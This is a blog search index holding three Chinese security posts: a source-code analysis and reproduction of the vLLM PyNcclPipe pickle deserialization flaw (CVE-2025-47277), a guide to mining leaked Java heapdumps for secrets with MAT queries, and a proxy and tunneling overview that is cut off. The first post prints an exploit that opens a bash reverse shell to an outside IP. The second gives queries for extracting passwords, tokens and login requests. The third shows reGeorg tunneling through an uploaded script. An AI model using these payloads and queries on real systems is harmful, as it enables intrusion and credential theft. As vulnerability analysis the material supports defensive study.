<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>vLLM PyNcclPipe pickle反序列化漏洞(CVE-2025-47277) 分析以及复现</title>
    <link href="/2025/08/12/vLLM%20PyNcclPipe%20pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2025-47277)%20%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/08/12/vLLM%20PyNcclPipe%20pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2025-47277)%20%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h3 id="vLLM-PyNcclPipe-pickle反序列化漏洞-CVE-2025-47277-分析以及复现"><a href="#vLLM-PyNcclPipe-pickle反序列化漏洞-CVE-2025-47277-分析以及复现" class="headerlink" title="vLLM PyNcclPipe pickle反序列化漏洞(CVE-2025-47277) 分析以及复现"></a>vLLM PyNcclPipe pickle反序列化漏洞(CVE-2025-47277) 分析以及复现</h3><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>一个影响了V0引擎与PyNcclPipe模块的反序列化漏洞。主要成因是未验证的去反序列化来自于网络的数据，攻击者通过构造恶意的序列化数据并进行传递，即可在服务端被反序列化恶意数据，导致任意代码的执行。</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul><li>vLLM &gt;&#x3D; 0.6.5 并且 &lt;0.8.5</li><li>使用V0引擎</li><li>PyNcclPipe KV cache 传输集成</li><li>具体的pr可见security部分</li></ul><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul><li>pip install torch&#x3D;&#x3D;2.1.2 –index-url <a href="https://download.pytorch.org/whl/cpu">https://download.pytorch.org/whl/cpu</a> </li><li>pip install vllm&#x3D;&#x3D;0.7.3</li></ul><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="千算万算不如不算"><a href="#千算万算不如不算" class="headerlink" title="千算万算不如不算"></a>千算万算不如不算</h3><p>首先git clone <a href="https://github.com/vllm-project/vllm.git%EF%BC%88%E5%AD%98%E5%9C%A8%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%89%88%E6%9C%AC%EF%BC%89">https://github.com/vllm-project/vllm.git（存在漏洞的版本）</a></p><p>或者使用 git checkout v0.7.3</p><p><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-hjq4-87xh-g4fv">https://github.com/vllm-project/vllm/security/advisories/GHSA-hjq4-87xh-g4fv</a></p><p>这篇github的security文章中给出了exp以及触发漏洞的调用堆栈信息</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">vllm<span class="hljs-selector-class">.distributed</span><span class="hljs-selector-class">.kv_transfer</span><span class="hljs-selector-class">.kv_pipe</span><span class="hljs-selector-class">.pynccl_pipe</span><span class="hljs-selector-class">.PyNcclPipe</span>._recv_impl<br>-&gt; vllm<span class="hljs-selector-class">.distributed</span><span class="hljs-selector-class">.kv_transfer</span><span class="hljs-selector-class">.kv_pipe</span><span class="hljs-selector-class">.pynccl_pipe</span><span class="hljs-selector-class">.PyNcclPipe</span>._recv_metadata<br>-&gt; vllm<span class="hljs-selector-class">.distributed</span><span class="hljs-selector-class">.utils</span><span class="hljs-selector-class">.StatelessProcessGroup</span><span class="hljs-selector-class">.recv_obj</span><br>-&gt; pickle<span class="hljs-selector-class">.loads</span> <br></code></pre></td></tr></table></figure><p>根据堆栈信息我们可以直接找到漏洞的入口位置</p><ul><li>vllm&#x2F;distributed&#x2F;kv_transfer&#x2F;kv_pipe&#x2F;pynccl_pipe.py</li></ul><p>跟踪到第一个位置，再往下是PyNcclPipe这个类的定义 以及 _recv_impl这个方法的触发</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> vllm.distributed.kv_transfer.kv_pipe.pynccl_pipe import PyNcclPipe<br><span class="hljs-keyword">from</span> vllm.config import KVTransferConfig<br><br><span class="hljs-attribute">config</span>=KVTransferConfig(<br>    <span class="hljs-attribute">kv_ip</span>=<span class="hljs-string">&quot;0.0.0.0&quot;</span>,<br>    <span class="hljs-attribute">kv_port</span>=18888,<br>    <span class="hljs-attribute">kv_rank</span>=0,<br>    <span class="hljs-attribute">kv_parallel_size</span>=1,<br>    <span class="hljs-attribute">kv_buffer_size</span>=1024,<br>    <span class="hljs-attribute">kv_buffer_device</span>=<span class="hljs-string">&quot;cpu&quot;</span><br>)<br><br><span class="hljs-attribute">p</span>=PyNcclPipe(config=config,local_rank=0)<br>p.recv_tensor() # Receive data<br></code></pre></td></tr></table></figure><p>这里先看简化过的server.py</p><p>可以看到p&#x3D;PyNcclPipe(config&#x3D;config,local_rank&#x3D;0) 这一行实际上是 新建了一个PyNcclPipe对象，并且传入了参数。</p><p>先观察一下该对象的构造函数都做了什么事情</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs lua"><br>def __init__():<br>    <span class="hljs-built_in">self</span>.<span class="hljs-built_in">config</span> = <span class="hljs-built_in">config</span><br>    <span class="hljs-built_in">self</span>.local_rank = local_rank<br>    <span class="hljs-built_in">self</span>.kv_rank = <span class="hljs-built_in">self</span>.<span class="hljs-built_in">config</span>.kv_rank<br>    <span class="hljs-built_in">self</span>.kv_parallel_size = <span class="hljs-built_in">self</span>.<span class="hljs-built_in">config</span>.kv_parallel_size<br>    <br>    <span class="hljs-built_in">self</span>.group = StatelessProcessGroup.<span class="hljs-built_in">create</span>(<br>        host=<span class="hljs-built_in">self</span>.<span class="hljs-built_in">config</span>.kv_ip,<br>        port=<span class="hljs-built_in">self</span>.<span class="hljs-built_in">config</span>.kv_port + port_offset,<br>        rank=<span class="hljs-built_in">self</span>.kv_rank,<br>        world_size=<span class="hljs-built_in">self</span>.kv_parallel_size,<br>    )<br></code></pre></td></tr></table></figure><p>上面是简化版本的构造函数，其中创建了一个StatelessProcessGroup类的示例 并且赋值给了self.group</p><p>跟入create方法</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">store = TCPStore(<br>    <span class="hljs-attribute">host_name</span>=host,<br>    <span class="hljs-attribute">port</span>=port,<br>    <span class="hljs-attribute">world_size</span>=world_size,<br>    is_master=(rank == 0),<br>)<br></code></pre></td></tr></table></figure><p>这里是一个TCPStore实例的声明</p><p>可以看到host和port都是由传参进行的赋值</p><p>回溯过去看也就是 kv_ip和kv_port的传值</p><p>kv_ip&#x3D;”0.0.0.0”,<br>kv_port&#x3D;18888,</p><p>那么应该是如上所述才对，也就是说host是可控的，不应该会发生未授权的情况，顶多就是配置不当才会导致漏洞被触发。</p><p>但是实际上 把这个0.0.0.0改为其他的host值，例如127.0.0.1（本地），漏洞也同样存在。</p><p>这里我们可以在本地起一个demo来验证</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> torch.distributed <span class="hljs-keyword">import</span> TCPStore<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> timedelta<br><br><br><span class="hljs-comment"># 假设当前机器端口 18888 空闲</span><br>store = TCPStore(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">18888</span>, <span class="hljs-number">1</span>, <span class="hljs-literal">True</span>, timedelta(seconds=<span class="hljs-number">30</span>))<br><br><span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;TCPStore 已启动，按回车退出...&quot;</span>)<br></code></pre></td></tr></table></figure><p>pip show torch来安装库</p><p>netstat -anv | grep 18888 查看一下监听的范围</p><p><img src="/../image/%E6%B5%8B%E8%AF%95/image-20250815204712285.png" alt="image-20250815204712285"></p><p>这里就可以明显看到 监听的是所有的ip （*.18888）</p><p>原因所在是虽然传参以及代码中都很完美的去指定了host的值，但是这个底层基于TCPStore实现</p><p>而TCPStore是基于c++而来的（<a href="https://github.com/pytorch/pytorch/blob/main/torch/csrc/distributed/c10d/TCPStore.cpp%EF%BC%89">https://github.com/pytorch/pytorch/blob/main/torch/csrc/distributed/c10d/TCPStore.cpp）</a></p><p>在它的代码中，并未显式设置ip的值，仅能设置port的值</p><p>create_libuv_tcpstore_backend(opts)&#x2F;create_tcpstore_backend(opts);</p><p>都只有port的定义，并未涉及ip，所以ip的指定遵循底层的默认设计，也就是0.0.0.0</p><p>因此在网络层面上产生了针对于任意ip的未授权访问、数据传输</p><h3 id="老生常谈之反序列化"><a href="#老生常谈之反序列化" class="headerlink" title="老生常谈之反序列化"></a>老生常谈之反序列化</h3><p>清楚了未授权的由来，接下来只需要找到一个反序列化点即可</p><p>接着看server.py的最后一行</p><p>recv_tensor()</p><p>跟入该函数，查看定义</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-keyword">future</span> = <span class="hljs-keyword">self</span>.transport_thread.submit(<span class="hljs-keyword">self</span>._recv_impl)<br></code></pre></td></tr></table></figure><p>可以看到这里调用了 _recv_impl，继续跟入</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">metadata</span> <span class="hljs-operator">=</span> self._recv_metadata()<br></code></pre></td></tr></table></figure><p>其中会执行这一行代码，继续跟入_recv_metadata()</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">return</span> <span class="hljs-built_in">self</span>.<span class="hljs-keyword">group</span>.recv_obj(<span class="hljs-built_in">self</span>.target_rank_for_recv)<br></code></pre></td></tr></table></figure><p>发现这里有recv_obj()，继续跟入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">recv_obj</span>(<span class="hljs-params">self, src: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-type">Any</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;Receive an object from a source rank.&quot;&quot;&quot;</span><br>    obj = pickle.loads(<br>        <span class="hljs-variable language_">self</span>.store.get(<br>            <span class="hljs-string">f&quot;send_to/<span class="hljs-subst">&#123;self.rank&#125;</span>/<span class="hljs-subst">&#123;self.recv_src_counter[src]&#125;</span>&quot;</span>))<br>    <span class="hljs-variable language_">self</span>.recv_src_counter[src] += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> obj<br></code></pre></td></tr></table></figure><p>这里跟到了pickle.loads()，很明显是一个反序列化的点位</p><p>pickle.loads(self.store.get(f”send_to&#x2F;{self.rank}&#x2F;{self.recv_src_counter[src]}”))</p><p>单独取出来，查看反序列化数据来源</p><p>而这个self.store是一个键值对的形式</p><p>其中get方法就是通过传入键取出值，键即为(f”send_to&#x2F;{self.rank}&#x2F;{self.recv_src_counter[src]}”)</p><p>只需要传入对应的键值对即可触发反序列化漏洞</p><p>这里贴一下exp的代码来分析</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> vllm.distributed.utils import StatelessProcessGroup<br><br>class Evil:<br>    def __reduce__(self):<br>        import os<br>        <span class="hljs-attribute">cmd</span>=<span class="hljs-string">&#x27;/bin/bash -c &quot;bash -i &gt;&amp; /dev/tcp/172.28.176.1/8888 0&gt;&amp;1&quot;&#x27;</span><br>        return (os.system,(cmd,))<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">client </span>= StatelessProcessGroup.create(<br>    <span class="hljs-attribute">host</span>=<span class="hljs-string">&#x27;172.17.0.1&#x27;</span>,<br>    <span class="hljs-attribute">port</span>=18888,<br>    <span class="hljs-attribute">rank</span>=1,<br>    <span class="hljs-attribute">world_size</span>=2,<br>)<br><br>client.send_obj(<span class="hljs-attribute">obj</span>=Evil(),dst=0)<br></code></pre></td></tr></table></figure><p>我们这里跟入send_obj这个函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_obj</span>(<span class="hljs-params">self, obj: <span class="hljs-type">Any</span>, dst: <span class="hljs-built_in">int</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Send an object to a destination rank.&quot;&quot;&quot;</span><br>    <span class="hljs-variable language_">self</span>.expire_data()<br>    key = <span class="hljs-string">f&quot;send_to/<span class="hljs-subst">&#123;dst&#125;</span>/<span class="hljs-subst">&#123;self.send_dst_counter[dst]&#125;</span>&quot;</span><br>    <span class="hljs-variable language_">self</span>.store.<span class="hljs-built_in">set</span>(key, pickle.dumps(obj))<br>    <span class="hljs-variable language_">self</span>.send_dst_counter[dst] += <span class="hljs-number">1</span><br>    <span class="hljs-variable language_">self</span>.entries.append((key, time.time()))<br></code></pre></td></tr></table></figure><p>传参一个obj，一个dst，这里obj即为exp里的对象</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">key</span> <span class="hljs-operator">=</span> f<span class="hljs-string">&quot;send_to/&#123;dst&#125;/&#123;self.send_dst_counter[dst]&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>key的赋值 “send_to&#x2F;0&#x2F;0”</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">self<span class="hljs-selector-class">.store</span><span class="hljs-selector-class">.set</span>(key, pickle<span class="hljs-selector-class">.dumps</span>(obj))<br></code></pre></td></tr></table></figure><p>恶意对象的反序列化以及键值对的写入</p><p>最终传输到服务端</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">f&quot;send_to/<span class="hljs-subst">&#123;self.rank&#125;</span>/<span class="hljs-subst">&#123;self.recv_src_counter[src]&#125;</span>&quot;</span>))<br></code></pre></td></tr></table></figure><p>值被读出，并且被反序列化</p><p>恶意代码执行</p><h3 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h3><p>这里实战的注意点其实还有一个键值对的传递（发送与接收）</p><p>为什么一定能接到？</p><p>因为</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">self<span class="hljs-selector-class">.send_dst_counter</span> = &#123;<span class="hljs-selector-tag">i</span>: <span class="hljs-number">0</span> <span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.world_size)&#125;<br>self<span class="hljs-selector-class">.recv_src_counter</span> = &#123;<span class="hljs-selector-tag">i</span>: <span class="hljs-number">0</span> <span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.world_size)&#125;<br></code></pre></td></tr></table></figure><p>这两个字典推导式可以看出，初始值为{0,0}，只要遍历完了，就肯定能接到反序列化数据。</p><p>当然演示的时候这个server和poc 肯定得是0,0 因为这是我们演示所用的，并没有正常的业务去抢占。</p><p>如果恰好失败，也可以使用爆破的方式去实现反序列化，毕竟数量很小。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>如何利用MAT分析heapdump</title>
    <link href="/2025/03/24/%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8MAT%E5%88%86%E6%9E%90heapdump/"/>
    <url>/2025/03/24/%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8MAT%E5%88%86%E6%9E%90heapdump/</url>
    
    <content type="html"><![CDATA[<p>下载链接：<a href="https://www.eclipse.org/mat/">https://www.eclipse.org/mat/</a></p><p><a href="https://landgrey.me/blog/16/">https://landgrey.me/blog/16/</a></p><p><a href="https://mp.weixin.qq.com/s/_T8GoaIT4T-e8tCQUBVJEg">https://mp.weixin.qq.com/s/_T8GoaIT4T-e8tCQUBVJEg</a></p><p>什么是MAT？ 一款内存分析工具。</p><p>目前市面上大部分关于heapdump的说法都是去找xx工具一把梭，看解密后的内容有没有能利用的。这些工具只是提取了大部分的关键信息，还有一些信息没有被提取出来，通过MAT可以更细致的分析。</p><h1 id="OQL语句"><a href="#OQL语句" class="headerlink" title="OQL语句"></a>OQL语句</h1><h2 id="查询环境变量的key值"><a href="#查询环境变量的key值" class="headerlink" title="查询环境变量的key值"></a>查询环境变量的key值</h2><ul><li>通过env端点的泄露 确定有哪些环境变量 直接采用关键字查询，分为spring1.x以及2.x两个版本 不同版本对应的实例不同</li><li>spring1.x<ul><li>存储在java.util.Hashtable$Entry中，因此查询的时候把语句里的实例名写为java.util.Hashtable$Entry即可</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))<br></code></pre></td></tr></table></figure><ul><li>spring2.x<ul><li>存储在java.util.LinkedHashMap$Entry中</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">select * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">SELECT * FROM java.util.LinkedHashMap$Entry x WHERE x.key.toString().matches(&quot;(?i).*password.*&quot;)<br></code></pre></td></tr></table></figure><p>通过正则去匹配 </p><p>如果查询到的value值是方法</p><ul><li>SELECT * FROM com.shuangqi.common.core.domain.entity.SysUserEntity 直接去查询这个类 看有没有声明的实例</li></ul><p>除了env中能看到的key外，还可以尝试搜索一些别的关键字</p><ul><li>例如 jwt、 bearer  、session、eyJ、token、secret</li></ul><h2 id="查询heapdump中除了环境变量以外的泄露值"><a href="#查询heapdump中除了环境变量以外的泄露值" class="headerlink" title="查询heapdump中除了环境变量以外的泄露值"></a><font style="color:#000000;background-color:#ffffff;">查询heapdump中除了环境变量以外的泄露值</font></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">select * from java.lang.String x WHERE x.toString().startsWith(&quot;abcd&quot;)<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">select * from org.apache.shiro.web.mgt.CookieRememberMeManager<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">select * from byte[] s wheretoString(s) like &quot;.*token.*&quot;<br></code></pre></td></tr></table></figure><p>寻找byte[] 实例中的 包含token的 数据 使用Shallow Heap排序 从大到小 可能可以找到请求包和返回包的明文数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">select * from java.lang.String s where toString(s) like &quot;.*(GET|POST) /.*&quot;<br></code></pre></td></tr></table></figure><p><img src="/../image/%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8MAT%E5%88%86%E6%9E%90heapdump/1740647012076-3e2a3f18-f542-4ee6-869d-1666ee2b71b7.png"></p><p>右键</p><p>选择第一项 with outgonging</p><p>然后排序 看包的大小 大的包 有可能有明文请求 比如登陆包</p><p>提取内存中的绝对路径</p><p><font style="color:#923775;background-color:#ffffff;">SELECT</font><font style="color:#000000;background-color:#ffffff;"> file.path.value.</font><font style="color:#923775;background-color:#ffffff;">toString</font><font style="color:#000000;background-color:#ffffff;">() </font><font style="color:#923775;background-color:#ffffff;">FROM</font><font style="color:#000000;background-color:#ffffff;"> java.io.File file</font></p><p><font style="color:#000000;background-color:#ffffff;">按照字符串长度进行搜索</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">SELECT * FROM byte[] s WHERE (s.toString().length() &gt; 100)<br>SELECT * FROM java.lang.String s WHERE (s.toString().length() &gt; 100)<br>select * from char[] s where s.@length &gt; 100 <br></code></pre></td></tr></table></figure><p>脚本工具：</p><p><font style="color:rgba(0, 0, 0, 0.9);"><a href="https://github.com/wyzxxz/heapdump_tool">https://github.com/wyzxxz/heapdump_tool</a></font></p><p><font style="color:rgba(0, 0, 0, 0.9);"><a href="https://github.com/whwlsfb/JDumpSpider">https://github.com/whwlsfb/JDumpSpider</a></font></p><p><font style="color:rgba(0, 0, 0, 0.9);"><a href="https://github.com/wdahlenburg/pyhprof">https://github.com/wdahlenburg/pyhprof</a></font></p><p>多跑几个工具 搜集信息全点</p><p>JDumpSpider无脑跑</p><p>heapdump_tool使用</p><ul><li>需要配置jhat为环境变量</li><li>建议选择模式1 信息更加全面 方法更加丰富</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>正反向代理总结</title>
    <link href="/2025/01/22/%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/"/>
    <url>/2025/01/22/%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="正反向代理"><a href="#正反向代理" class="headerlink" title="正反向代理"></a>正反向代理</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><h3 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h3><p><img src="/../image/%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/image-20250117090202931.png" alt="image-20250117090202931"></p><p>  正向代理通常由用户自己设置，客户端主动向代理服务器发送一个请求，然后代理服务器向服务器发送请求，收到服务器响应，并把响应发送给客户端。</p><p>  正向代理的过程中，隐藏了真实的请求客户端，服务端不知道真实的客户端是谁，客户端请求的服务都被代理服务器代替请求。</p><p>例如：</p><p><img src="/../image/%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/image-20250117090927553.png" alt="image-20250117090927553"></p><h3 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h3><p><img src="/../image/%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/image-20250117091153459.png" alt="image-20250117091153459"></p><p>  不需要客户端（浏览器）去做任何配置，例如上图用nginx做的一个反向代理服务器，与正向代理的区别是，客户端发送请求给反向代理服务器，但是对于客户端来说，该代理是透明的（不被客户端所知道），所以客户端发送的请求，会被反向代理服务器（nginx）做出判断，从而发送到服务端（tomcat），隐藏了真实的服务端。</p><ul><li>nginx配置反向代理tomcat</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;<br>    <span class="hljs-attribute">server_name</span> yourdomain.com;  <span class="hljs-comment"># 你的域名或者IP地址</span><br><br>    <span class="hljs-comment"># 根目录和默认首页</span><br>    <span class="hljs-attribute">root</span> /var/www/html;<br>    <span class="hljs-attribute">index</span> index.html index.htm;<br><br>    <span class="hljs-comment"># 处理静态文件请求（如 HTML、CSS、JS）</span><br>    <span class="hljs-section">location</span> / &#123;<br>        <span class="hljs-attribute">try_files</span> <span class="hljs-variable">$uri</span> <span class="hljs-variable">$uri</span>/ =<span class="hljs-number">404</span>;  <span class="hljs-comment"># 如果文件不存在则返回404</span><br>    &#125;<br><br>    <span class="hljs-comment"># 反向代理到 Tomcat</span><br>    <span class="hljs-section">location</span> /app/ &#123;<br>        <span class="hljs-attribute">proxy_pass</span> http://127.0.0.1:8080/;  <span class="hljs-comment"># 将 /app/ 下的请求转发到 Tomcat</span><br>        <span class="hljs-attribute">proxy_set_header</span> Host <span class="hljs-variable">$host</span>;  <span class="hljs-comment"># 保留客户端请求头的主机信息</span><br>        <span class="hljs-attribute">proxy_set_header</span> X-Real-IP <span class="hljs-variable">$remote_addr</span>;  <span class="hljs-comment"># 客户端真实 IP</span><br>        <span class="hljs-attribute">proxy_set_header</span> X-Forwarded-For <span class="hljs-variable">$proxy_add_x_forwarded_for</span>;  <span class="hljs-comment"># 客户端 IP 列表</span><br>        <span class="hljs-attribute">proxy_set_header</span> X-Forwarded-Proto <span class="hljs-variable">$scheme</span>;  <span class="hljs-comment"># 客户端请求协议（http 或 https）</span><br>    &#125;<br><br>    <span class="hljs-comment"># 处理 Tomcat 返回的错误页面</span><br>    <span class="hljs-attribute">error_page</span> <span class="hljs-number">500</span> <span class="hljs-number">502</span> <span class="hljs-number">503</span> <span class="hljs-number">504</span> /50x.html;<br>    <span class="hljs-section">location</span> = /50x.html &#123;<br>        <span class="hljs-attribute">root</span> /usr/share/nginx/html;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>反向代理优势</p><p>可以用作配置负载均衡，缓解服务端压力（例如tomcat）</p><p>隐藏服务端真实地址（不同服务器）</p></li></ul><p><img src="/../image/%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/image-20250117092741278.png" alt="image-20250117092741278"></p><p><img src="/../image/%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/image-20250117092749289.png" alt="image-20250117092749289"></p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="正向代理-1"><a href="#正向代理-1" class="headerlink" title="正向代理"></a>正向代理</h3><h4 id="reGeorg-正向代理"><a href="#reGeorg-正向代理" class="headerlink" title="reGeorg 正向代理"></a>reGeorg 正向代理</h4><ul><li>项目地址：<a href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a></li><li>将对应语言的脚本文件上传到目标机器 访问如下即可</li><li>然后使用reGeorgSocksProxy.py执行如下命令链接代理文件 显示如下说明成功</li><li>python2 reGeorgSocksProxy.py -l 0.0.0.0 -p 1080 -u <a href="http://192.168.166.118/templates/beez3/k.php">http://192.168.166.118/templates/beez3/k.php</a><br><img src="/../image/%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/image-20240928201905014.png" alt="image-20240928201905014"></li><li>然后proxifier设置代理即可</li></ul><h4 id="Neo-reGeorg"><a href="#Neo-reGeorg" class="headerlink" title="Neo-reGeorg"></a>Neo-reGeorg</h4><ul><li>项目地址：<a href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></li><li>特点<ul><li>重构上面那个</li><li>base64加密</li><li>http头随机生成 